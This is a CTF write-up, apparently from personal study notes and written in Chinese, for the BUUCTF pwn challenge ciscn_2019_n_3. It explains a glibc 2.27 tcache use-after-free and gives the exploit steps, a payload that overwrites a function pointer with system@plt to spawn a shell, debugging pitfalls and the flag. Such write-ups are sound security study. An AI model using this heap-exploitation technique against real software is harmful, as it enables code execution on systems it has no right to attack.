---
type: source
created: 2026-05-11
updated: 2026-05-11
related: [[[../memory/tech_feedbacks.md]]]
---

# ciscn_2019_n_3 (BUUCTF)

32-bit glibc 2.27 tcache UAF。record 结构体含函数指针，delete 后不清零 records[] → 悬挂指针。利用 tcache LIFO 让新 note 的 strbuf 落在旧 record 地址上，覆写函数指针为 system@plt，触发 `system("sh;#...")`。

涉及概念：[[concepts/tcache-uaf-funcptr-overwrite]]
涉及实体：[[entities/ctf_buu]]、[[entities/lib_glibc-2.27]]

## 挑战

32-bit ELF，Partial RELRO / Canary / NX / No PIE。glibc 2.27 (Ubuntu 18)。远程 `node5.buuoj.cn:29744`。

## 结构体

```c
struct record {  // malloc(0xc) → 0x10 chunk
    void (*print)(struct record *);   // +0
    void (*free_func)(struct record *); // +4
    union { int val; char *str; };    // +8
};
```

全局 `records[17]` 存指针。Integer 类型只有 record 一个 chunk；Text 类型额外 `malloc(size)` 分配 strbuf。

## 漏洞

`do_del` 调用 `*(records[idx]+4)(records[idx])` 后**不置空 records[idx]**。`rec_int_free` 只 `free(record)` 不清指针 → UAF。

## 利用

```
1. new_int(0)  → record_0 (0x10)
2. new_int(1)  → record_1 (0x10)
3. del(0)      → tcache[0x10]: record_0
4. del(1)      → tcache[0x10]: record_1 → record_0
5. new_str(2, 0xc, "sh;#" + p32(system_plt))
   record_2 = record_1 (pop)
   strbuf_2 = record_0 (pop) ← payload 写到这里
   records[0] 仍指向 record_0 = strbuf_2
6. del(0) → *(records[0]+4)(records[0]) = system("sh;#...")
```

## Payload 设计

```python
payload = b"sh;#" + p32(0x8048500)  # system@plt
```

- `"sh;#"` 是合法 shell 命令（`#` 注释后续垃圾字节）
- 偏移 +4 处是 `system@plt`，被当函数指针调用
- 参数 = records[0] = 指向 "sh;#..." → `system("sh")`

不用 `"sh\x00\x00"` 是因为 fgets 交互中 null byte 会导致 sendlineafter 异常。

## Flag

```
flag{a65c01cb-8b44-4c86-b315-b8503297c804}
```

## 踩坑

1. **null byte 导致 EOF**：第一版 `b"sh\x00\x00" + p32(system)` 远程直接断连。改 `"sh;#"` 全可打印解决。
2. **tcache LIFO 顺序**：`new_str` 先 malloc record 再 malloc strbuf，所以 strbuf 是第二次 pop，正好落在 record_0 上。
3. **不需要 leak**：No PIE + system@plt 已知，纯 UAF 覆写函数指针一步到位。
